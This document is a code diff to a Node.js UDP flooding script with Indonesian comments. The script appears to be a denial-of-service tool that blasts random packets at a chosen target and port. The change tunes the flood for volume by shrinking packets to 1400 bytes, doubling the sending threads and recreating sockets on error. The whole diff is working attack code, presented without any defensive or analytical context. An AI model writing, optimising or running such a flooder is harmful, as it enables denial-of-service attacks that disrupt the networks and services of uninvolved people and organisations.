@@ -14,17 +14,17 @@ const hostname = os.hostname();
 let sent = 0;
 let start = Date.now();
 
-// ========== UDP MAKSIMAL ==========
+// ========== UDP OPTIMAL ==========
 if (method === 'udp') {
-    // PAKAI PAYLOAD MAKSIMAL 65500 BYTES
-    const payload = crypto.randomBytes(65500);
+    // PAYLOAD 1400 BYTES (MTU AMAN)
+    const payload = crypto.randomBytes(1400);
     
-    // SET SOCKET OPTIONS BIAR LEBIH CEPET
-    for(let i = 0; i < threads; i++) {
+    // THREAD LEBIH BANYAK (per thread lebih ringan)
+    const realThreads = threads * 2; // double dari yg dikasih
+    
+    for(let i = 0; i < realThreads; i++) {
         const sock = dgram.createSocket('udp4');
         sock.on('error', () => {});
-        
-        // GA USAH BIND BIAR OS YANG MILIHIN PORT (CEPET)
         
         const send = () => {
             sock.send(payload, port, target, (err) => {
@@ -32,7 +32,6 @@ if (method === 'udp') {
                     sent++;
                     setImmediate(send);
                 } else {
-                    // KALO ERROR, BUAT SOCKET BARU
                     sock.close();
                     setTimeout(() => {
                         const newSock = dgram.createSocket('udp4');
@@ -48,7 +47,7 @@ if (method === 'udp') {
     setTimeout(() => {
         const elapsed = (Date.now() - start) / 1000;
         const pps = sent / elapsed;
-        const mbps = (sent * 65500 * 8) / elapsed / 1024 / 1024;
+        const mbps = (sent * 1400 * 8) / elapsed / 1024 / 1024;
         console.log(`✅ UDP | ${sent.toLocaleString()} pkts | ${pps.toFixed(0)} PPS | ${mbps.toFixed(2)} Mbps`);
         process.exit(0);
     }, duration * 1000);
